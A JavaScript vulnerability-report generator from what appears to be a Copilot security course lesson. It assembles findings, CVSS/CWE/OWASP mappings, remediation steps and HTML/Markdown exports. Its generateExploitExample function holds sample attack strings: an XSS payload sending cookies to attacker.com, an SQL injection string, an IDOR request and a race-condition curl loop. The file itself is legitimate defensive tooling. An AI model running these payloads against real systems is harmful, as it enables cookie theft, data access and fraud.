/**
 * Vulnerability Report Generator
 * ==============================
 * Course: GitHub Copilot for Cybersecurity Specialists
 * Lesson: 01 - Vulnerability Detection
 *
 * Generates comprehensive vulnerability reports with actionable remediation steps.
 *
 * Copilot Chat Prompt:
 * "Generate a vulnerability report structure that includes:
 *  - Summary statistics (critical/high/medium counts)
 *  - Detailed findings with affected code
 *  - Example exploits showing how to abuse the vulnerability
 *  - Step-by-step remediation with code snippets
 *  - Estimated effort in hours
 *  - References to OWASP, CWE, internal policies"
 */

const fs = require('fs');
const path = require('path');

/**
 * Generate comprehensive vulnerability report
 */
function generateVulnerabilityReport(findings, metadata = {}) {
  const report = {
    // Report metadata
    metadata: {
      reportId: `VR-${Date.now()}`,
      generatedAt: new Date().toISOString(),
      scanTool: metadata.scanTool || 'Custom Security Scanner',
      targetApplication: metadata.targetApp || 'Unknown',
      targetEnvironment: metadata.environment || 'Development',
      scanDuration: metadata.duration || 'N/A',
      scanType: metadata.scanType || 'Automated',
      analyst: metadata.analyst || 'GitHub Copilot Security Scanner'
    },

    // Executive summary
    executiveSummary: {
      riskLevel: calculateOverallRisk(findings),
      totalVulnerabilities: findings.length,
      criticalCount: findings.filter(f => f.severity === 'CRITICAL').length,
      highCount: findings.filter(f => f.severity === 'HIGH').length,
      mediumCount: findings.filter(f => f.severity === 'MEDIUM').length,
      lowCount: findings.filter(f => f.severity === 'LOW').length,
      keyFindings: generateKeyFindings(findings),
      recommendedActions: generateTopRecommendations(findings)
    },

    // Detailed findings
    findings: findings.map((f, index) => ({
      id: `VULN-${String(index + 1).padStart(3, '0')}`,
      title: f.description?.substring(0, 100) || f.type,
      severity: f.severity,
      status: 'Open',
      category: f.type,

      // Technical details
      technical: {
        affectedEndpoint: f.endpoint,
        affectedComponent: f.component || 'API',
        vulnerableCode: f.codeSnippet || null,
        attackVector: f.evidence?.attackVector || generateAttackVector(f),
        exploitExample: generateExploitExample(f),
        proofOfConcept: f.evidence?.responsePreview || null
      },

      // Impact assessment
      impact: {
        confidentiality: assessConfidentialityImpact(f),
        integrity: assessIntegrityImpact(f),
        availability: assessAvailabilityImpact(f),
        businessImpact: f.businessImpact || generateBusinessImpact(f),
        dataAtRisk: f.dataAtRisk || identifyDataAtRisk(f)
      },

      // Remediation guidance
      remediation: {
        summary: generateRemediationSummary(f),
        steps: f.remediation?.steps || generateRemediationSteps(f),
        secureCodeExample: f.remediation?.secureCodeExample || generateSecureCode(f),
        estimatedEffort: estimateRemediationEffort(f),
        priority: determinePriority(f),
        assignedTo: null,
        dueDate: calculateDueDate(f)
      },

      // Compliance and references
      compliance: {
        cwe: f.cwe || mapToCWE(f.type),
        owasp: f.owasp || mapToOWASP(f.type),
        cvss: calculateCVSS(f),
        internalPolicy: mapToInternalPolicy(f.type),
        externalReferences: generateReferences(f)
      },

      // Metadata
      discoveredAt: f.discoveredAt || new Date().toISOString(),
      lastVerified: new Date().toISOString()
    })),

    // Remediation roadmap
    remediationRoadmap: generateRemediationRoadmap(findings),

    // Statistics and trends
    statistics: {
      bySeverity: countBySeverity(findings),
      byCategory: countByCategory(findings),
      byComponent: countByComponent(findings)
    },

    // Appendices
    appendices: {
      methodology: generateMethodologySection(),
      toolsUsed: metadata.tools || ['Custom IDOR Scanner', 'Race Condition Scanner'],
      glossary: generateGlossary(),
      changeLog: [{
        date: new Date().toISOString(),
        version: '1.0',
        changes: 'Initial report generated'
      }]
    }
  };

  return report;
}

/**
 * Calculate overall risk level
 */
function calculateOverallRisk(findings) {
  const critical = findings.filter(f => f.severity === 'CRITICAL').length;
  const high = findings.filter(f => f.severity === 'HIGH').length;

  if (critical > 0) return 'CRITICAL';
  if (high > 0) return 'HIGH';
  if (findings.length > 5) return 'MEDIUM';
  return 'LOW';
}

/**
 * Generate key findings summary
 */
function generateKeyFindings(findings) {
  return findings
    .filter(f => ['CRITICAL', 'HIGH'].includes(f.severity))
    .slice(0, 5)
    .map(f => ({
      title: f.description?.substring(0, 80) || f.type,
      severity: f.severity,
      impact: f.impact || 'See detailed finding'
    }));
}

/**
 * Generate top recommendations
 */
function generateTopRecommendations(findings) {
  const recommendations = [];

  if (findings.some(f => f.type === 'IDOR')) {
    recommendations.push({
      priority: 1,
      action: 'Implement tenant isolation in all database queries',
      impact: 'Prevents cross-tenant data access'
    });
  }

  if (findings.some(f => f.type === 'RACE_CONDITION')) {
    recommendations.push({
      priority: 2,
      action: 'Add database-level locking for critical operations',
      impact: 'Prevents race condition exploits'
    });
  }

  if (findings.some(f => f.type === 'SQL_INJECTION')) {
    recommendations.push({
      priority: 1,
      action: 'Convert all queries to parameterized statements',
      impact: 'Eliminates SQL injection risk'
    });
  }

  return recommendations;
}

/**
 * Generate attack vector description
 */
function generateAttackVector(finding) {
  const vectors = {
    'IDOR': 'Attacker manipulates resource ID in URL to access unauthorized data',
    'RACE_CONDITION': 'Attacker sends concurrent requests to exploit timing window',
    'SQL_INJECTION': 'Attacker injects SQL commands via user input fields',
    'XSS': 'Attacker injects malicious scripts that execute in victim browsers'
  };
  return vectors[finding.type] || 'Manual exploitation required';
}

/**
 * Generate exploit example
 */
function generateExploitExample(finding) {
  const examples = {
    'IDOR': `curl -X GET "${finding.endpoint}/OTHER_USER_ID" -H "Authorization: Bearer ATTACKER_TOKEN"`,
    'RACE_CONDITION': `for i in {1..50}; do curl -X POST "${finding.endpoint}" -d '{"code":"COUPON"}' & done; wait`,
    'SQL_INJECTION': `curl -X GET "${finding.endpoint}?id=1' OR '1'='1"`,
    'XSS': `<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>`
  };
  return examples[finding.type] || 'See detailed finding for exploitation steps';
}

/**
 * Assess confidentiality impact
 */
function assessConfidentialityImpact(finding) {
  if (finding.severity === 'CRITICAL') return 'HIGH - Sensitive data fully exposed';
  if (finding.severity === 'HIGH') return 'MEDIUM - Partial data exposure';
  return 'LOW - Limited data exposure';
}

/**
 * Assess integrity impact
 */
function assessIntegrityImpact(finding) {
  if (finding.type === 'MASS_ASSIGNMENT') return 'HIGH - Data can be modified';
  if (finding.subtype === 'BALANCE_OVERDRAW') return 'CRITICAL - Financial data corrupted';
  return 'LOW - Limited modification capability';
}

/**
 * Assess availability impact
 */
function assessAvailabilityImpact(finding) {
  if (finding.type === 'RACE_CONDITION') return 'MEDIUM - Service degradation possible';
  return 'LOW - Limited availability impact';
}

/**
 * Generate business impact description
 */
function generateBusinessImpact(finding) {
  const impacts = {
    'IDOR': 'Data breach risk, regulatory fines, reputation damage',
    'RACE_CONDITION': 'Financial loss, inventory issues, customer disputes',
    'SQL_INJECTION': 'Complete database compromise, data theft',
    'XSS': 'Account takeover, data theft, malware distribution'
  };
  return impacts[finding.type] || 'Business operations may be affected';
}

/**
 * Identify data at risk
 */
function identifyDataAtRisk(finding) {
  if (finding.type === 'IDOR') {
    return ['Customer PII', 'Financial records', 'Business documents'];
  }
  if (finding.subtype === 'BALANCE_OVERDRAW') {
    return ['Account balances', 'Transaction history'];
  }
  return ['Application data'];
}

/**
 * Generate remediation summary
 */
function generateRemediationSummary(finding) {
  const summaries = {
    'IDOR': 'Add authorization checks to verify resource ownership before access',
    'RACE_CONDITION': 'Implement proper locking mechanisms for concurrent operations',
    'SQL_INJECTION': 'Use parameterized queries for all database operations',
    'XSS': 'Sanitize output and implement Content Security Policy'
  };
  return summaries[finding.type] || 'Implement security controls';
}

/**
 * Generate remediation steps
 */
function generateRemediationSteps(finding) {
  const steps = {
    'IDOR': [
      'Add tenant_id filter to all database queries',
      'Verify user ownership before returning data',
      'Implement row-level security at database level',
      'Add authorization middleware to API endpoints',
      'Write unit tests for authorization checks'
    ],
    'RACE_CONDITION': [
      'Identify critical sections in code',
      'Implement database transactions with proper isolation',
      'Use row-level locking for updates',
      'Add unique constraints to prevent duplicates',
      'Implement idempotency keys for API requests'
    ]
  };
  return steps[finding.type] || ['Review and fix the vulnerability'];
}

/**
 * Generate secure code example
 */
function generateSecureCode(finding) {
  const code = {
    'IDOR': `
// Secure: Always filter by tenant
const document = await db.query(
  'SELECT * FROM documents WHERE id = ? AND tenant_id = ?',
  [docId, req.user.tenantId]
);
if (!document) return res.status(404).json({ error: 'Not found' });
`,
    'SQL_INJECTION': `
// Secure: Use parameterized queries
const [rows] = await pool.execute(
  'SELECT * FROM users WHERE id = ?',
  [userId]
);
`
  };
  return code[finding.type] || '// Implement secure alternative';
}

/**
 * Estimate remediation effort
 */
function estimateRemediationEffort(finding) {
  const efforts = {
    'CRITICAL': { hours: '4-8', complexity: 'High' },
    'HIGH': { hours: '2-4', complexity: 'Medium' },
    'MEDIUM': { hours: '1-2', complexity: 'Low' },
    'LOW': { hours: '0.5-1', complexity: 'Low' }
  };
  return efforts[finding.severity] || { hours: '2-4', complexity: 'Medium' };
}

/**
 * Determine remediation priority
 */
function determinePriority(finding) {
  if (finding.severity === 'CRITICAL') return 'P1 - Immediate';
  if (finding.severity === 'HIGH') return 'P2 - This Sprint';
  if (finding.severity === 'MEDIUM') return 'P3 - Next Sprint';
  return 'P4 - Backlog';
}

/**
 * Calculate due date based on severity
 */
function calculateDueDate(finding) {
  const now = new Date();
  const days = {
    'CRITICAL': 1,
    'HIGH': 7,
    'MEDIUM': 30,
    'LOW': 90
  };
  now.setDate(now.getDate() + (days[finding.severity] || 30));
  return now.toISOString().split('T')[0];
}

/**
 * Map finding type to CWE
 */
function mapToCWE(type) {
  const mapping = {
    'IDOR': 'CWE-639',
    'SQL_INJECTION': 'CWE-89',
    'XSS': 'CWE-79',
    'RACE_CONDITION': 'CWE-362',
    'MASS_ASSIGNMENT': 'CWE-915',
    'PATH_TRAVERSAL': 'CWE-22',
    'COMMAND_INJECTION': 'CWE-78'
  };
  return mapping[type] || 'CWE-Unknown';
}

/**
 * Map finding type to OWASP category
 */
function mapToOWASP(type) {
  const mapping = {
    'IDOR': 'A01:2021 - Broken Access Control',
    'SQL_INJECTION': 'A03:2021 - Injection',
    'XSS': 'A03:2021 - Injection',
    'RACE_CONDITION': 'A04:2021 - Insecure Design',
    'MASS_ASSIGNMENT': 'A01:2021 - Broken Access Control'
  };
  return mapping[type] || 'OWASP Top 10';
}

/**
 * Calculate CVSS score (simplified)
 */
function calculateCVSS(finding) {
  const scores = {
    'CRITICAL': { score: 9.8, vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H' },
    'HIGH': { score: 7.5, vector: 'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N' },
    'MEDIUM': { score: 5.3, vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N' },
    'LOW': { score: 3.1, vector: 'CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:N/A:N' }
  };
  return scores[finding.severity] || scores['MEDIUM'];
}

/**
 * Map to internal security policy
 */
function mapToInternalPolicy(type) {
  return {
    section: 'SEC-' + type.substring(0, 4),
    policy: 'Information Security Policy',
    requirement: 'All applications must implement proper access controls'
  };
}

/**
 * Generate external references
 */
function generateReferences(finding) {
  return [
    `https://cwe.mitre.org/data/definitions/${finding.cwe?.split('-')[1] || '639'}.html`,
    'https://owasp.org/Top10/',
    'https://cheatsheetseries.owasp.org/'
  ];
}

/**
 * Generate remediation roadmap
 */
function generateRemediationRoadmap(findings) {
  const critical = findings.filter(f => f.severity === 'CRITICAL');
  const high = findings.filter(f => f.severity === 'HIGH');
  const medium = findings.filter(f => f.severity === 'MEDIUM');

  return {
    immediate: {
      timeframe: '24-48 hours',
      findings: critical.map(f => f.type),
      actions: ['Emergency patch deployment', 'Incident response if exploited']
    },
    shortTerm: {
      timeframe: '1-2 weeks',
      findings: high.map(f => f.type),
      actions: ['Security sprint', 'Code review and fixes']
    },
    mediumTerm: {
      timeframe: '1-3 months',
      findings: medium.map(f => f.type),
      actions: ['Scheduled maintenance', 'Security hardening']
    }
  };
}

/**
 * Count findings by severity
 */
function countBySeverity(findings) {
  return findings.reduce((acc, f) => {
    acc[f.severity] = (acc[f.severity] || 0) + 1;
    return acc;
  }, {});
}

/**
 * Count findings by category
 */
function countByCategory(findings) {
  return findings.reduce((acc, f) => {
    acc[f.type] = (acc[f.type] || 0) + 1;
    return acc;
  }, {});
}

/**
 * Count findings by component
 */
function countByComponent(findings) {
  return findings.reduce((acc, f) => {
    const component = f.component || 'API';
    acc[component] = (acc[component] || 0) + 1;
    return acc;
  }, {});
}

/**
 * Generate methodology section
 */
function generateMethodologySection() {
  return {
    approach: 'Automated scanning with manual verification',
    scope: 'Application APIs and business logic',
    techniques: [
      'IDOR testing via cross-tenant access attempts',
      'Race condition testing via concurrent requests',
      'Input validation testing',
      'Authentication and authorization bypass attempts'
    ],
    limitations: [
      'Automated scanning may not detect all logic flaws',
      'Test coverage depends on provided credentials',
      'Some vulnerabilities require manual verification'
    ]
  };
}

/**
 * Generate glossary
 */
function generateGlossary() {
  return {
    'IDOR': 'Insecure Direct Object Reference - accessing resources by manipulating identifiers',
    'Race Condition': 'Timing vulnerability where concurrent operations can lead to unexpected behavior',
    'CVSS': 'Common Vulnerability Scoring System - standardized severity rating',
    'CWE': 'Common Weakness Enumeration - vulnerability classification system',
    'OWASP': 'Open Web Application Security Project'
  };
}

/**
 * Export report to different formats
 */
function exportReport(report, format = 'json', outputPath = './report') {
  switch (format) {
    case 'json':
      fs.writeFileSync(
        `${outputPath}.json`,
        JSON.stringify(report, null, 2)
      );
      break;

    case 'html':
      const html = generateHTMLReport(report);
      fs.writeFileSync(`${outputPath}.html`, html);
      break;

    case 'markdown':
      const md = generateMarkdownReport(report);
      fs.writeFileSync(`${outputPath}.md`, md);
      break;

    default:
      throw new Error(`Unsupported format: ${format}`);
  }

  console.log(`Report exported to ${outputPath}.${format}`);
}

/**
 * Generate HTML report
 */
function generateHTMLReport(report) {
  return `<!DOCTYPE html>
<html>
<head>
  <title>Vulnerability Report - ${report.metadata.reportId}</title>
  <style>
    body { font-family: Arial, sans-serif; margin: 40px; }
    .critical { color: #d32f2f; }
    .high { color: #f57c00; }
    .medium { color: #fbc02d; }
    .finding { border: 1px solid #ddd; padding: 20px; margin: 20px 0; }
    code { background: #f5f5f5; padding: 2px 6px; }
    pre { background: #f5f5f5; padding: 15px; overflow-x: auto; }
  </style>
</head>
<body>
  <h1>Security Vulnerability Report</h1>
  <p>Report ID: ${report.metadata.reportId}</p>
  <p>Generated: ${report.metadata.generatedAt}</p>

  <h2>Executive Summary</h2>
  <p>Overall Risk: <strong class="${report.executiveSummary.riskLevel.toLowerCase()}">${report.executiveSummary.riskLevel}</strong></p>
  <ul>
    <li>Critical: ${report.executiveSummary.criticalCount}</li>
    <li>High: ${report.executiveSummary.highCount}</li>
    <li>Medium: ${report.executiveSummary.mediumCount}</li>
  </ul>

  <h2>Findings</h2>
  ${report.findings.map(f => `
    <div class="finding">
      <h3 class="${f.severity.toLowerCase()}">${f.id}: ${f.title}</h3>
      <p><strong>Severity:</strong> ${f.severity}</p>
      <p><strong>Endpoint:</strong> ${f.technical.affectedEndpoint}</p>
      <p><strong>Impact:</strong> ${f.impact.businessImpact}</p>
      <h4>Remediation</h4>
      <ul>${f.remediation.steps.map(s => `<li>${s}</li>`).join('')}</ul>
    </div>
  `).join('')}
</body>
</html>`;
}

/**
 * Generate Markdown report
 */
function generateMarkdownReport(report) {
  return `# Security Vulnerability Report

**Report ID:** ${report.metadata.reportId}
**Generated:** ${report.metadata.generatedAt}

## Executive Summary

**Overall Risk Level:** ${report.executiveSummary.riskLevel}

| Severity | Count |
|----------|-------|
| Critical | ${report.executiveSummary.criticalCount} |
| High | ${report.executiveSummary.highCount} |
| Medium | ${report.executiveSummary.mediumCount} |

## Findings

${report.findings.map(f => `
### ${f.id}: ${f.title}

- **Severity:** ${f.severity}
- **Endpoint:** ${f.technical.affectedEndpoint}
- **CWE:** ${f.compliance.cwe}
- **OWASP:** ${f.compliance.owasp}

**Impact:** ${f.impact.businessImpact}

**Remediation Steps:**
${f.remediation.steps.map(s => `1. ${s}`).join('\n')}

---
`).join('')}
`;
}

module.exports = {
  generateVulnerabilityReport,
  exportReport
};

// CLI execution
if (require.main === module) {
  // Example usage with sample findings
  const sampleFindings = [
    {
      severity: 'CRITICAL',
      type: 'IDOR',
      endpoint: '/api/documents/123',
      description: 'Cross-tenant document access via IDOR',
      evidence: { responsePreview: '{"id": 123, "tenant": "other"}' }
    },
    {
      severity: 'HIGH',
      type: 'RACE_CONDITION',
      subtype: 'COUPON_REUSE',
      endpoint: '/api/apply-coupon',
      description: 'Coupon reused 5 times via race condition'
    }
  ];

  const report = generateVulnerabilityReport(sampleFindings, {
    targetApp: 'Demo SaaS Application',
    environment: 'Staging',
    analyst: 'Security Team'
  });

  exportReport(report, 'json', './vulnerability-report');
  exportReport(report, 'markdown', './vulnerability-report');

  console.log('\nReport generated successfully!');
}
